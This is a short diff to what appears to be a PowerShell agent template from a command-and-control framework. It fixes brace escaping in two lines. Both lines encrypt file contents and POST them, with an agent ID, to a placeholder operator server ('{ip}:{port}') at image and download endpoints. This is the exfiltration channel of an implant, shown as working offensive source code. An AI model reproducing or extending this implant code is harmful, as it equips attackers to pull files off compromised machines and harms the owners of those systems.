@@ -64,7 +64,7 @@ $file_content = Get-Content $File -Encoding Byte
 $content = enc -key $key -un $file_content -file 1
 
             $postParams = @{data=":$content`:"}
-            $re=Invoke-WebRequest -Uri {{HTTP}}://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
+            $re=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{image}?page=$agent -Method POST -Body $postParams
 
 
 $final=[System.Convert]::FromBase64String($content)
@@ -90,7 +90,7 @@ return $output
 
 
             $postParams = @{f=$filename;d=$content}
-            $output=Invoke-WebRequest -Uri {{HTTP}}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
+            $output=Invoke-WebRequest -Uri {HTTP}://{ip}:{port}{download}?page=$agent -Method POST -Body $postParams
             #echo "returned $re.RawContent"
 
 
